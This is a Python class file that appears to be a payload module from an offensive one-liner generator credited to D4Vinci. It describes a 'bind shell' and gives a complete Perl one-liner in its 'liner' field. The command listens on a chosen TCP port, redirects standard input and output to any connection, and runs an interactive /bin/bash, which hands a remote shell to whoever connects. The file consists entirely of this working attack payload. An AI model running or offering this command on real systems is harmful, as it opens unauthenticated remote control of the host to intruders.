class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Uses perl sockets to establish a bind shell on specifed port."
    function    = "bind shell"
    liner       = """perl -MSocket -e '$VAR1=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($VAR1, INADDR_ANY));listen(S,SOMAXCONN);for(;$VAR1=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'"""
